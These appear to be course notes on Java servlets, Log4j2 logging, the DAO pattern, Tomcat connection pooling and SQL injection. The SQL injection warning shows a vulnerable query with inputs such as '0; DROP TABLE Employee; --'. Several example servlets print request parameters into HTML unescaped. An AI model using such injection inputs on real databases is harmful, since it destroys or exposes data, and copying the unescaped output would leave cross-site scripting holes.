> **Pattern:** set MDC → try { process + LOGGER.info } catch { LOGGER.error + rethrow } finally { remove MDC }.

> [!Example] log4j2.xml Configuration
> Reference: `https://logging.apache.org/log4j/2.x/manual/configuration.html`
>
> ```xml
> <Configuration status="INFO" monitorInterval="0" name="hello-log4j">
>   <Appenders>
>     <!-- Rolling file: rotates daily and at 250 MB -->
>     <RollingRandomAccessFile name="RFILE"
>       fileName="${sys:catalina.base}/webapps/my-logs/hello-log4j.log"
>       filePattern="${sys:catalina.base}/webapps/my-logs/$${date:yyyy-MM}/hello-log4j-%d{yyyyMMdd}-%i.log.gz">
>       <PatternLayout>
>         <Pattern>%date{DEFAULT} %level [%thread] %class{1}.%method(%file:%line)%n
>           \tIP = %MDC{IP}; USER = %MDC{USER}; ACTION = %MDC{ACTION}; RESOURCE = %MDC{RESOURCE}%n
>           \t%message%n\t%throwable%n</Pattern>
>       </PatternLayout>
>       <Policies>
>         <TimeBasedTriggeringPolicy />
>         <SizeBasedTriggeringPolicy size="250 MB"/>
>       </Policies>
>     </RollingRandomAccessFile>
>
>     <!-- Console output -->
>     <Console name="STDOUT" target="SYSTEM_OUT">
>       <PatternLayout>
>         <Pattern>%date{DEFAULT} %level [%thread] %class{1}.%method(%file:%line)%n
>           \tIP = %MDC{IP}; USER = %MDC{USER}; ACTION = %MDC{ACTION}; RESOURCE = %MDC{RESOURCE}%n
>           \t%message%n\t%throwable%n</Pattern>
>       </PatternLayout>
>     </Console>
>   </Appenders>
>   <Loggers>
>     <Root level="TRACE">
>       <AppenderRef ref="RFILE"  level="INFO"/>
>       <AppenderRef ref="STDOUT" level="INFO"/>
>     </Root>
>   </Loggers>
> </Configuration>
> ```
>
> **Key:** `%MDC{KEY}` injects ThreadContext values into each log line.

Log4J Maven dependency (not `provided` — must be bundled in WAR):

```xml
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-api</artifactId>
  <version>2.x.x</version>
</dependency>
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.x.x</version>
</dependency>
```

### GET and POST Forms

> [!Example] HTML Forms — GET vs POST
> **Context:** HTML `<form>` sends parameters either as URL query string (GET) or request body (POST). The `action` path is relative to the current page location.
>
> ```html
> <!-- GET form: parameters appear in URL -->
> <form method="GET" action="../helloworld-get">
>   <label for="helloName">Enter your name:</label>
>   <input name="helloName" type="text"/>
>   <button type="submit">Submit</button>
>   <button type="reset">Reset the form</button>
> </form>
>
> <!-- POST form: parameters in request body, not visible in URL -->
> <form method="POST" action="../helloworld-post">
>   <label for="helloName">Enter your name:</label>
>   <input name="helloName" type="text"/>
>   <button type="submit">Submit</button>
>   <button type="reset">Reset the form</button>
> </form>
> ```
>
> **Note:** `../` is needed because servlets are at the webapp root `/` while HTML pages are under `/html/`.

> [!Example] Separate GET and POST Servlets
> ```java
> public class HelloWorldFormGetServlet extends HttpServlet {
>     public void doGet(HttpServletRequest req, HttpServletResponse res)
>             throws ServletException, IOException {
>         res.setContentType("text/html; charset=utf-8");
>         PrintWriter out = res.getWriter();
>         String name = req.getParameter("helloName");  // retrieve by input name attribute
>         out.printf("<!DOCTYPE html>%n<html lang=\"en\">...");
>         out.printf("Hello, %s!%n", name);
>         // ...
>         out.flush();
>         out.close();
>     }
> }
>
> public class HelloWorldFormPostServlet extends HttpServlet {
>     public void doPost(HttpServletRequest req, HttpServletResponse res)
>             throws ServletException, IOException {
>         res.setContentType("text/html; charset=utf-8");
>         PrintWriter out = res.getWriter();
>         String name = req.getParameter("helloName");  // same API, regardless of GET/POST
>         // ... same response writing ...
>         out.flush();
>         out.close();
>     }
> }
> ```
>
> **Key:** `req.getParameter("name")` retrieves form parameters identically for both GET and POST.

> [!Example] Unified GET+POST Servlet
> When parameter parsing is identical for both methods, delegate `doPost` to `doGet`:
>
> ```java
> public class HelloWorldFormServlet extends HttpServlet {
>
>     public void doGet(HttpServletRequest req, HttpServletResponse res)
>             throws ServletException, IOException {
>         String name = req.getParameter("helloName");
>         // ... generate response using name ...
>     }
>
>     public void doPost(HttpServletRequest req, HttpServletResponse res)
>             throws ServletException, IOException {
>         doGet(req, res);  // delegate entirely
>     }
> }
> ```

web.xml for multiple servlets with distinct URL patterns:

```xml
<servlet>
  <servlet-name>HelloWorldGet</servlet-name>
  <servlet-class>it.unipd.dei.webapp.HelloWorldFormGetServlet</servlet-class>
</servlet>
<servlet>
  <servlet-name>HelloWorldPost</servlet-name>
  <servlet-class>it.unipd.dei.webapp.HelloWorldFormPostServlet</servlet-class>
</servlet>

<servlet-mapping>
  <servlet-name>HelloWorldGet</servlet-name>
  <url-pattern>/helloworld-get</url-pattern>
</servlet-mapping>
<servlet-mapping>
  <servlet-name>HelloWorldPost</servlet-name>
  <url-pattern>/helloworld-post</url-pattern>
</servlet-mapping>
```

> [!Example] Using a Third-Party Library (Figlet)
> Add to `pom.xml` dependencies (no `provided` scope — must be in WAR):
>
> ```xml
> <dependency>
>   <groupId>com.github.dtmo.jfiglet</groupId>
>   <artifactId>jfiglet</artifactId>
>   <version>1.0.1</version>
> </dependency>
> ```
>
> Usage in servlet:
>
> ```java
> final FigletRenderer figletRenderer =
>     new FigletRenderer(FigFontResources.loadFigFontResource(FigFontResources.SLANT_FLF));
> final String output = figletRenderer.renderText("Hello, world!");
>
> out.printf("<p><pre>%n");
> out.printf("%s%n", output);   // use <pre> to preserve ASCII-art whitespace
> out.printf("</pre></p>%n");
> ```
>
> The exercise at the end of the slides asks to combine the form example with Figlet: handle GET and POST form submissions and render the submitted value as ASCII art.

---

## Summary Table

| Concept | Description | Notes |
|---------|-------------|-------|
| **Jakarta EE** | Standardized platform for multi-tiered enterprise apps | Formerly Java EE; moved to Eclipse Foundation in 2018 |
| **Web container** | Runtime that executes web components | Tomcat 11 implements Jakarta EE |
| **Servlet** | Java class generating dynamic HTTP responses | Extends `HttpServlet`; not thread-safe |
| **Servlet lifecycle** | `init()` → `service()` [×N] → `destroy()` | Container controls instantiation and destruction |
| **`doGet` / `doPost`** | HTTP-method-specific handlers called by `service()` | Override these, not `service()` directly |
| **`HttpServletRequest`** | Encapsulates the incoming HTTP request | `getParameter(name)` for form fields |
| **`HttpServletResponse`** | Encapsulates the outgoing HTTP response | `setContentType()` + `getWriter()` |
| **`web.xml`** | Deployment descriptor: declares servlets, URL mappings | Lives in `WEB-INF/`; not accessible to browsers |
| **WAR** | Web ARchive — deployable package for web apps | `<packaging>war</packaging>` in Maven |
| **`scope=provided`** | Servlet API dependency not bundled in WAR | Tomcat already provides it at runtime |
| **Log4J 2** | Logging framework: Loggers → Appenders → Layouts | `TRACE < DEBUG < INFO < WARN < ERROR < FATAL` |
| **ThreadContext (MDC)** | Per-thread key-value store for log context | Set before processing, remove in `finally` |
| **`Filter`** | Intercepts requests/responses before/after servlet | Used for auth, compression, logging |

## Questions

1. How do the browser and web server components cooperate to transform an HTTP request into a rendered response?
2. What distinguishes server-side web technologies such as servlets and JSP from client-side technologies such as JavaScript?
3. What is the role of Jakarta EE, and why is Tomcat considered an implementation of the web container part of that platform?
4. Why does the package transition from `javax.*` to `jakarta.*` matter when choosing a Tomcat version and servlet API dependency?
5. What makes a servlet a dynamic web component, and why is it not safe to store request-specific state in servlet instance variables?
6. How do `Servlet`, `GenericServlet`, `HttpServlet`, `HttpServletRequest`, and `HttpServletResponse` relate in the servlet class model?
7. What happens during the servlet lifecycle from first request through `init()`, repeated `service()` calls, and `destroy()`?
8. How does the first request sequence differ from subsequent requests in the servlet sequence diagram?
9. Why is `WEB-INF/` not directly accessible from the browser, and what kinds of files belong there?
10. How does `web.xml` connect servlet classes to URL patterns, and why can one servlet have multiple mappings?
11. Why must a servlet web application use WAR packaging, and how does Maven help produce the deployable archive?
12. Why is the servlet API dependency marked as `provided`, while libraries such as Log4J or Figlet must be bundled in the WAR?
13. What are the essential response-generation steps in the HelloWorld servlet, from setting the MIME type to closing the writer?
14. How does Log4J ThreadContext improve request logging, and why must the context be cleared in a `finally` block?
15. How do GET and POST forms differ in where parameters are sent, and why can `req.getParameter()` retrieve values for both?

# Java Servlets and Access to the Database

## Table of Contents

- [[#Overall Architecture|Overall Architecture]]
  - [[#Full-Stack Technology Stack|Full-Stack Technology Stack]]
  - [[#Application Layers|Application Layers]]
- [[#Resource Classes (Java Beans)|Resource Classes (Java Beans)]]
  - [[#The Employee Class|The Employee Class]]
  - [[#The Message Class|The Message Class]]
  - [[#The Employee Database Schema|The Employee Database Schema]]
- [[#The Data Access Object (DAO) Pattern|The Data Access Object (DAO) Pattern]]
  - [[#DataAccessObject Interface|DataAccessObject Interface]]
  - [[#AbstractDAO Class|AbstractDAO Class]]
  - [[#CreateEmployeeDAO|CreateEmployeeDAO]]
  - [[#SearchEmployeeBySalaryDAO|SearchEmployeeBySalaryDAO]]
- [[#Connection Pool via Tomcat|Connection Pool via Tomcat]]
  - [[#context.xml Configuration|context.xml Configuration]]
  - [[#web.xml Resource Reference|web.xml Resource Reference]]
  - [[#Maven POM Dependencies|Maven POM Dependencies]]
- [[#Servlet Layer|Servlet Layer]]
  - [[#AbstractDatabaseServlet|AbstractDatabaseServlet]]
  - [[#CreateEmployeeServlet|CreateEmployeeServlet]]
  - [[#SearchEmployeeBySalaryServlet|SearchEmployeeBySalaryServlet]]
- [[#Sequence Diagrams|Sequence Diagrams]]
- [[#SQL Injection|SQL Injection]]
- [[#Class Diagram|Class Diagram]]
- [[#Summary Table|Summary Table]]

---

## Overall Architecture

### Full-Stack Technology Stack

Full-stack web applications combine multiple layers. The course uses:

- **Client tier**: HTML5, CSS3, JavaScript (jQuery, AJAX)
- **Web tier**: Java Servlets, JSP
- **API layer**: REST (JSON), SOAP
- **Database tier**: *PostgreSQL*
- **Infrastructure**: Docker, Maven, Tomcat

### Application Layers

The architecture is split into three logical layers:

1. **Interface/Business Logic Layer** — Servlets handle HTTP, parse parameters, call DAOs, write HTML responses
2. **Data Logic Layer** — DAO classes encapsulate all SQL; no SQL outside DAO classes
3. **Data Layer** — PostgreSQL DBMS

The class diagram later in this note shows how servlet classes, DAO classes, resource classes, and database-facing components implement these layers.

The application demonstrates two features:
- **Create Employee**: POST form → servlet → DAO → INSERT into DB
- **Search Employee by Salary**: POST form → servlet → DAO → SELECT → return list

---

## Resource Classes (Java Beans)

Resource classes (**Java Beans**) represent domain objects. They live in `it.unipd.dei.webapp.resource`. They are **immutable** — all fields are `final`, only getters, no setters.

### The Employee Class

```java
package it.unipd.dei.webapp.resource;

public class Employee {

    private final int badge;
    private final String surname;
    private final int age;
    private final int salary;

    public Employee(final int badge, final String surname, final int age, final int salary) {
        this.badge = badge;
        this.surname = surname;
        this.age = age;
        this.salary = salary;
    }

    public final int getBadge()      { return badge; }
    public final String getSurname() { return surname; }
    public final int getAge()        { return age; }
    public final int getSalary()     { return salary; }
}
```

**Key design**: fields are `final` → immutable after construction. Accessor methods are also `final` → subclasses cannot override them.

### The Message Class

```java
package it.unipd.dei.webapp.resource;

public class Message {

    private final String message;
    private final String errorCode;
    private final String errorDetails;
    private final boolean isError;

    // Constructor for error messages
    public Message(final String message, final String errorCode, final String errorDetails) {
        this.message = message;
        this.errorCode = errorCode;
        this.errorDetails = errorDetails;
        this.isError = true;
    }

    // Constructor for informative (non-error) messages
    public Message(final String message) {
        this.message = message;
        this.errorCode = null;
        this.errorDetails = null;
        this.isError = false;
    }

    public final String getMessage()      { return message; }
    public final String getErrorCode()    { return errorCode; }
    public final String getErrorDetails() { return errorDetails; }
    public final boolean isError()        { return isError; }
}
```

`Message` is used by servlets to carry either success info or structured error info (code + details) to the view.

### The Employee Database Schema

```
Employee(Badge PK, Surname, Age, Salary)
Manage(Manager FK→Employee.Badge, Employee FK→Employee.Badge)
```

Sample data:

| Badge | Surname | Age | Salary |
|-------|---------|-----|--------|
| 7309  | Rossi   | 34  | 45     |
| 5998  | Bianchi | 37  | 38     |
| 9553  | Neri    | 42  | 35     |
| 5698  | Bruni   | 43  | 42     |
| 4076  | Mori    | 45  | 50     |
| 8123  | Lupi    | 46  | 60     |

Sample management relationships:

| Manager | Employee |
|---------|----------|
| 7309 | 5698 |
| 5998 | 5698 |
| 9553 | 4076 |
| 5698 | 4076 |
| 4076 | 8123 |

---

## The Data Access Object (DAO) Pattern

> [!Important] DAO Pattern
> The **Data Access Object (DAO)** pattern abstracts and encapsulates all logic needed to access a data source (typically a relational DB). Benefits:
> - Decouples business logic from persistence logic
> - Each DAO is responsible for the persistence of **one resource** (e.g., `Employee`)
> - All DAOs implement a **common interface** → uniform usage; enables automation via reflection
>
> **Intuition:** Servlets never write SQL. They instantiate a DAO, call `access()`, and get results via `getOutputParam()`.

Reference: `https://www.oracle.com/java/technologies/dataaccessobject.html`.

### DataAccessObject Interface

![[db-dao-interface.jpg|560]]
*Figure 1: DAO interface used to separate data access from application logic*

```java
public interface DataAccessObject<T> {

    /**
     * Accesses the database.
     * @return reference to this DataAccessObject (for chaining)
     * @throws SQLException if something goes wrong
     */
    DataAccessObject<T> access() throws SQLException;

    /**
     * Retrieves any output parameters after the database access.
     * @return output parameter, or null if none
     */
    T getOutputParam();
}
```

- `T` = type of the output parameter (e.g., `List<Employee>`, or `Void`)
- `access()` performs the operation and returns `this` (enabling chaining: `.access().getOutputParam()`)
- `getOutputParam()` retrieves the result after `access()` completes

### AbstractDAO Class

![[db-abstract-dao.jpg|560]]
*Figure 2: AbstractDAO class with common database operation handling*

`AbstractDAO<T>` provides the base implementation:

| Member | Role |
|--------|------|
| `LOGGER` | Log4J logger |
| `con` | JDBC `Connection` (injected via constructor) |
| `outputParam : T` | Stores the result of `doAccess()` |
| `accessed : boolean` | Guards against double-execution |
| `lock : Object` | Synchronization object |
| `access()` | Calls `doAccess()`, always closes the connection, rolls back on error |
| `doAccess()` | **Abstract** — subclasses implement the actual SQL logic |
| `getOutputParam()` | Returns `outputParam` after `access()` |

Key design decisions:
- **One-shot**: DAO objects are not meant to be reused; `accessed` flag prevents re-use
- **Connection lifetime**: `access()` always closes the connection in `finally`, even on error
- **Rollback**: `access()` rolls back the transaction if `doAccess()` throws
- **Thread safety**: `lock` and `accessed` guard against misuse (e.g., shared DAO reference)

### CreateEmployeeDAO

```java
public final class CreateEmployeeDAO extends AbstractDAO {

    private static final String STATEMENT =
        "INSERT INTO Ferro.Employee (badge, surname, age, salary) VALUES (?, ?, ?, ?)";

    private final Employee employee;

    public CreateEmployeeDAO(final Connection con, final Employee employee) {
        super(con);
        if (employee == null) {
            LOGGER.error("The employee cannot be null.");
            throw new NullPointerException("The employee cannot be null.");
        }
        this.employee = employee;
    }

    @Override
    protected final void doAccess() throws SQLException {
        PreparedStatement pstmt = null;
        try {
            pstmt = con.prepareStatement(STATEMENT);
            pstmt.setInt(1, employee.getBadge());
            pstmt.setString(2, employee.getSurname());
            pstmt.setInt(3, employee.getAge());
            pstmt.setInt(4, employee.getSalary());
            pstmt.execute();
            LOGGER.info("Employee %d successfully stored in the database.", employee.getBadge());
        } finally {
            if (pstmt != null) pstmt.close();
        }
    }
}
```

- No generic type parameter (no output) — extends `AbstractDAO` without `<T>`
- Uses `PreparedStatement` with `?` placeholders — **prevents SQL injection**
- Closes `PreparedStatement` in `finally`; connection closed by `AbstractDAO.access()`

### SearchEmployeeBySalaryDAO

```java
public final class SearchEmployeeBySalaryDAO extends AbstractDAO<List<Employee>> {

    private static final String STATEMENT =
        "SELECT badge, surname, age, salary FROM Ferro.Employee WHERE salary > ?";

    private final int salary;

    public SearchEmployeeBySalaryDAO(final Connection con, final int salary) {
        super(con);
        this.salary = salary;
    }

    @Override
    public final void doAccess() throws SQLException {
        PreparedStatement pstmt = null;
        ResultSet rs = null;
        final List<Employee> employees = new ArrayList<Employee>();

        try {
            pstmt = con.prepareStatement(STATEMENT);
            pstmt.setInt(1, salary);
            rs = pstmt.executeQuery();

            while (rs.next()) {
                employees.add(new Employee(
                    rs.getInt("badge"),
                    rs.getString("surname"),
                    rs.getInt("age"),
                    rs.getInt("salary")
                ));
            }
            LOGGER.info("Employee(s) with salary above %d successfully listed.", salary);
        } finally {
            if (rs != null)    rs.close();
            if (pstmt != null) pstmt.close();
        }

        this.outputParam = employees;  // set AFTER finally block
    }
}
```

- Generic parameter `<List<Employee>>` — `getOutputParam()` returns the list
- Iterates `ResultSet`, maps each row to an `Employee` object
- `outputParam` set **after** `finally` — closed resources are not accessed again

---

## Connection Pool via Tomcat

> [!Important] Connection Pool
> Opening a new JDBC connection per request is expensive (TCP handshake, authentication, protocol negotiation). A **connection pool** maintains a set of pre-opened connections that are lent to requests and returned after use.
>
> Tomcat manages the pool; servlets obtain connections via **JNDI** (*Java Naming and Directory Interface*) lookup.
>
> **Intuition:** Pool = shared parking lot of DB connections. Servlet borrows one, uses it, returns it.

References:
- `https://tomcat.apache.org/tomcat-10.1-doc/jdbc-pool.html`
- `https://tomcat.apache.org/tomcat-10.1-doc/jndi-resources-howto.html`

### context.xml Configuration

`context.xml` is placed in `src/main/webapp/META-INF/` and is copied to the WAR's `META-INF/` folder by Maven.

```xml
<Context>
  <Resource name="jdbc/employee-ferro"
            auth="Container"
            type="javax.sql.DataSource"
            factory="org.apache.tomcat.jdbc.pool.DataSourceFactory"
            driverClassName="org.postgresql.Driver"
            url="jdbc:postgresql://localhost:5432/esami"
            username="ferro"
            password="ferro"
            testOnBorrow="true"
            validationQuery="SELECT 1"
            timeBetweenEvictionRunsMillis="30000"
            maxActive="10"
            minIdle="5"
            maxWait="10000"
            initialSize="2"
            removeAbandonedTimeout="60"
            removeAbandoned="true"
            closeMethod="close"
  />
</Context>
```

| Parameter | Meaning |
|-----------|---------|
| `name` | JNDI name used to look up the pool (`java:/comp/env/jdbc/employee-ferro`) |
| `auth="Container"` | Tomcat authenticates using the provided credentials |
| `type` | Java type returned by lookup — `javax.sql.DataSource` |
| `factory` | Tomcat JDBC pool factory class |
| `driverClassName` | PostgreSQL JDBC driver |
| `url` | JDBC URL: `jdbc:postgresql://host:port/db` |
| `username` / `password` | DB credentials |
| `testOnBorrow` | Validate connection before lending it out |
| `validationQuery` | Query used to validate (`SELECT 1`) |
| `timeBetweenEvictionRunsMillis` | How often idle connections are checked (ms) |
| `maxActive` | Max connections in the pool |
| `minIdle` | Minimum idle connections kept alive |
| `maxWait` | Max ms to wait for a connection before throwing exception |
| `initialSize` | Connections created at pool startup |
| `removeAbandoned` | Reclaim connections not returned within timeout |
| `removeAbandonedTimeout` | Seconds before an un-returned connection is reclaimed |
| `closeMethod` | Method called on the pool when Tomcat no longer needs it (`close`) |

### web.xml Resource Reference

The `web.xml` must declare a `<resource-ref>` to expose the JNDI resource to the web application:

```xml
<resource-ref>
  <description>Connection pool to the database</description>
  <res-ref-name>jdbc/employee-ferro</res-ref-name>
  <res-type>javax.sql.DataSource</res-type>
  <res-auth>Container</res-auth>
</resource-ref>
```

Full `web.xml` also declares servlets and URL mappings:

```xml
<servlet>
  <servlet-name>SearchEmployeeBySalary</servlet-name>
  <servlet-class>it.unipd.dei.webapp.servlet.SearchEmployeeBySalaryServlet</servlet-class>
</servlet>
<servlet>
  <servlet-name>CreateEmployee</servlet-name>
  <servlet-class>it.unipd.dei.webapp.servlet.CreateEmployeeServlet</servlet-class>
</servlet>

<servlet-mapping>
  <servlet-name>SearchEmployeeBySalary</servlet-name>
  <url-pattern>/search-employee-by-salary</url-pattern>
</servlet-mapping>
<servlet-mapping>
  <servlet-name>CreateEmployee</servlet-name>
  <url-pattern>/create-employee</url-pattern>
</servlet-mapping>
```

### Maven POM Dependencies

```xml
<dependencies>
  <!-- Servlet API — provided by Tomcat -->
  <dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>javax.servlet-api</artifactId>
    <version>4.0.0</version>
    <scope>provided</scope>
  </dependency>

  <!-- PostgreSQL JDBC driver — must be bundled in WAR -->
  <dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.2.2</version>
  </dependency>

  <!-- Tomcat JDBC pool — provided by Tomcat, do NOT bundle -->
  <dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-jdbc</artifactId>
    <version>9.0.7</version>
    <scope>provided</scope>
  </dependency>
</dependencies>
```

Maven also copies `context.xml` to the WAR's `META-INF/`:

```xml
<resource>
  <targetPath>${basedir}/target/${project.artifactId}-${project.version}/html</targetPath>
  <directory>${basedir}/src/main/webapp/html</directory>
  <includes><include>**/*.*</include></includes>
</resource>

<resource>
  <targetPath>${basedir}/target/${project.artifactId}-${project.version}/META-INF</targetPath>
  <directory>${basedir}/src/main/webapp/META-INF</directory>
  <includes><include>**/*.*</include></includes>
</resource>
```

---

## Servlet Layer

### AbstractDatabaseServlet

`AbstractDatabaseServlet` extends `HttpServlet` and provides DB connection management to all concrete servlets via inheritance.

```java
public abstract class AbstractDatabaseServlet extends HttpServlet {

    protected static final Logger LOGGER = LogManager.getLogger(
        AbstractDatabaseServlet.class, StringFormatterMessageFactory.INSTANCE);

    private DataSource ds;

    @Override
    public void init(ServletConfig config) throws ServletException {
        InitialContext cxt;
        try {
            cxt = new InitialContext();
            // JNDI lookup: "java:/comp/env/" prefix is mandatory
            ds = (DataSource) cxt.lookup("java:/comp/env/jdbc/employee-ferro");
            LOGGER.info("Connection pool to the database pool successfully acquired.");
        } catch (NamingException e) {
            ds = null;
            LOGGER.error("Unable to acquire the connection pool to the database.", e);
            throw new ServletException("Unable to acquire the connection pool to the database", e);
        }
    }

    @Override
    public void destroy() {
        ds = null;
        LOGGER.info("Connection pool to the database pool successfully released.");
    }

    protected final Connection getConnection() throws SQLException {
        try {
            return ds.getConnection();
        } catch (final SQLException e) {
            LOGGER.error("Unable to acquire the connection from the pool.", e);
            throw e;
        }
    }
}
```

**Key points:**
- `init()` runs **once** at servlet startup — looks up the `DataSource` from JNDI
- `InitialContext` is the JNDI directory used for lookup; it is not the same thing as `ServletContext`
- `destroy()` runs **once** at shutdown — releases the `DataSource` reference
- `getConnection()` called per-request — returns a pooled connection
- The JNDI name prefix `java:/comp/env/` is **mandatory** at lookup time; it matches `jdbc/employee-ferro` declared in `web.xml`

### CreateEmployeeServlet

```java
public final class CreateEmployeeServlet extends AbstractDatabaseServlet {

    public void doPost(HttpServletRequest req, HttpServletResponse res) throws IOException {

        LogContext.setIPAddress(req.getRemoteAddr());
        LogContext.setAction(Actions.CREATE_EMPLOYEE);

        int badge = -1;
        String surname = null;
        int age = -1;
        int salary = -1;
        Employee e = null;
        Message m = null;

        try {
            badge   = Integer.parseInt(req.getParameter("badge"));
            surname = req.getParameter("surname");
            age     = Integer.parseInt(req.getParameter("age"));
            salary  = Integer.parseInt(req.getParameter("salary"));

            LogContext.setResource(req.getParameter("badge"));

            e = new Employee(badge, surname, age, salary);
            new CreateEmployeeDAO(getConnection(), e).access();
            m = new Message(String.format("Employee %d successfully created.", badge));
            LOGGER.info("Employee %d successfully created in the database.", badge);

        } catch (NumberFormatException ex) {
            m = new Message(
                "Cannot create the employee. Invalid input parameters: badge, age, and salary must be integer.",
                "E100", ex.getMessage());
            LOGGER.error("...", ex);

        } catch (SQLException ex) {
            if (ex.getSQLState().equals("23505")) {
                // 23505 = unique_violation in PostgreSQL
                m = new Message(
                    String.format("Cannot create the employee: employee %d already exists.", badge),
                    "E300", ex.getMessage());
            } else {
                m = new Message(
                    "Cannot create the employee: unexpected error while accessing the database.",
                    "E200", ex.getMessage());
            }
            LOGGER.error("...", ex);
        }

        try {
            res.setContentType("text/html; charset=utf-8");
            PrintWriter out = res.getWriter();
            out.printf("<!DOCTYPE html>%n<html lang=\"en\">...");

            if (m.isError()) {
                out.printf("<ul>%n");
                out.printf("<li>error code: %s</li>%n", m.getErrorCode());
                out.printf("<li>message: %s</li>%n", m.getMessage());
                out.printf("<li>details: %s</li>%n", m.getErrorDetails());
                out.printf("</ul>%n");
            } else {
                out.printf("<p>%s</p>%n", m.getMessage());
                out.printf("<li>badge: %s</li>%n", e.getBadge());
                // ... other fields ...
            }

            out.flush();
            out.close();
        } catch (IOException ex) {
            LOGGER.error("Unable to send response when creating employee %d.", badge, ex);
            throw ex;
        } finally {
            LogContext.removeIPAddress();
            LogContext.removeAction();
            LogContext.removeResource();
        }
    }
}
```

**Error codes used:**

| Code | Condition |
|------|-----------|
| E100 | Invalid input — badge/age/salary not integers (`NumberFormatException`) |
| E200 | Unexpected SQL error |
| E300 | Duplicate badge (PostgreSQL SQL state `23505` = unique_violation) |

### SearchEmployeeBySalaryServlet

```java
public final class SearchEmployeeBySalaryServlet extends AbstractDatabaseServlet {

    public void doPost(HttpServletRequest req, HttpServletResponse res) throws IOException {

        LogContext.setIPAddress(req.getRemoteAddr());
        LogContext.setAction(Actions.SEARCH_EMPLOYEE_BY_SALARY);

        int salary = -1;
        List<Employee> el = null;
        Message m = null;

        try {
            salary = Integer.parseInt(req.getParameter("salary"));

            // chain: access() returns this, then getOutputParam() returns the list
            el = new SearchEmployeeBySalaryDAO(getConnection(), salary).access().getOutputParam();

            m = new Message("Employees successfully searched.");
            LOGGER.info("Employees successfully searched by salary %d.", salary);

        } catch (NumberFormatException ex) {
            m = new Message(
                "Cannot search for employees. Invalid input parameters: salary must be integer.",
                "E100", ex.getMessage());
        } catch (SQLException ex) {
            m = new Message(
                "Cannot search for employees: unexpected error while accessing the database.",
                "E200", ex.getMessage());
        }

        try {
            res.setContentType("text/html; charset=utf-8");
            PrintWriter out = res.getWriter();
            // ...
            if (m.isError()) {
                // print error details
            } else {
                out.printf("<table>%n");
                out.printf("<tr><td>Badge</td><td>Surname</td><td>Age</td><td>Salary</td></tr>%n");
                for (Employee e : el) {
                    out.printf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>%n",
                        e.getBadge(), e.getSurname(), e.getAge(), e.getSalary());
                }
                out.printf("</table>%n");
            }
            out.flush();
            out.close();
        } catch (IOException ex) {
            LOGGER.error("Unable to send response.", ex);
            throw ex;
        } finally {
            LogContext.removeIPAddress();
            LogContext.removeAction();
            LogContext.removeUser();
        }
    }
}
```

**HTML Forms** (from `src/main/webapp/html/`):

```html
<!-- Create Employee -->
<form method="POST" action="../create-employee">
  <input name="badge"   type="text"/>
  <input name="surname" type="text"/>
  <input name="age"     type="text"/>
  <input name="salary"  type="text"/>
  <button type="submit">Submit</button>
  <button type="reset">Reset the form</button>
</form>

<!-- Search Employee by Salary -->
<form method="POST" action="../search-employee-by-salary">
  <input name="salary" type="text"/>
  <button type="submit">Submit</button>
  <button type="reset">Reset the form</button>
</form>
```

---

## Sequence Diagrams

### Create Employee

![[db-create-employee-sequence.jpg|560]]
*Figure 3: Employee creation sequence with servlet, DAO, and database*

1. Browser: `POST /create-employee`
2. Container instantiates `CreateEmployeeServlet` (1.1)
3. `init(ServletConfig)` → JNDI lookup → obtains `DataSource` (1.2–1.3)
4. `service()` → `doPost()` (1.4–1.4.1)
5. Parse POST params → create `Employee` object (1.4.2)
6. `getConnection()` from pool (1.4.3)
7. Instantiate `CreateEmployeeDAO(connection, employee)` (1.4.4)
8. `access()` → `doAccess()` → execute `INSERT INTO` on DB (1.4.5–1.4.5.1)
9. Create `Message` (success or error) (1.4.7)
10. Generate HTML response from `Employee` + `Message` (1.4.8–1.4.10)

### Search Employee

![[db-search-employee-sequence.jpg|520]]
*Figure 4: Employee search sequence by salary*

1. Browser: `POST /search-employee-by-salary`
2. Container instantiates `SearchEmployeeBySalaryServlet` (1.1–1.3)
3. `doPost()` → parse salary param (1.4.1–1.4.2)
4. `getConnection()` (1.4.2)
5. Instantiate `SearchEmployeeBySalaryDAO(connection, salary)` (1.4.3)
6. `access()` → `doAccess()` → execute `SELECT` → process `ResultSet` → build `Employee` list (1.4.4–1.4.4.1.4)
7. `getOutputParam()` → retrieve list (1.4.6–1.4.7)
8. Create `Message`, generate HTML table (1.4.8–1.4.11)

---

## SQL Injection

> [!Warning] SQL Injection
> SQL injection occurs when user-supplied input is concatenated directly into a SQL string, allowing attackers to alter the query structure.
>
> **Vulnerable example:**
> ```java
> // NEVER DO THIS
> String query = "SELECT * FROM Employee WHERE salary > " + req.getParameter("salary");
> Statement stmt = con.createStatement();
> ResultSet rs = stmt.executeQuery(query);
> ```
> An attacker can submit `salary = 0 OR 1=1` to return all rows, or `0; DROP TABLE Employee; --` to destroy data.
>
> **Mitigation:** Always use `PreparedStatement` with `?` placeholders:
> ```java
> String query = "SELECT * FROM Employee WHERE salary > ?";
> PreparedStatement pstmt = con.prepareStatement(query);
> pstmt.setInt(1, salary);   // value is escaped/typed — cannot alter query structure
> ResultSet rs = pstmt.executeQuery();
> ```
> `PreparedStatement` sends the query structure and parameters separately to the DB. The DB treats parameters as **data**, never as SQL syntax.

> [!Important] Why PreparedStatement is Safe
> - The SQL template is compiled by the DB engine **before** the parameter values are bound
> - Parameters are transmitted as typed values (int, String, …), not as raw SQL text
> - No user input can escape the parameter context and become SQL syntax
> - **Additional benefit**: for repeated queries with different values, the DB can reuse the compiled query plan (performance gain)

The DAO pattern enforces `PreparedStatement` usage by centralizing all SQL in DAO classes — no SQL ever appears in servlet code.

---

## Class Diagram

![[db-employee-class-diagram.jpg|560]]
*Figure 5: Class diagram of the servlet project with database access*

Key relationships:
- `CreateEmployeeServlet` and `SearchEmployeeBySalaryServlet` both extend `AbstractDatabaseServlet`
- Both servlets use `Message` (resource class)
- Both servlets use their respective DAO (`CreateEmployeeDAO`, `SearchEmployeeBySalaryDAO`)
- Both DAOs extend `AbstractDAO` which implements `DataAccessObject<T>`
- Both DAOs use `Employee` (resource class)

---

## Summary Table

| Component | Package | Role |
|-----------|---------|------|
| `Employee` | `resource` | Immutable bean: badge, surname, age, salary |
| `Message` | `resource` | Carries success or structured error info |
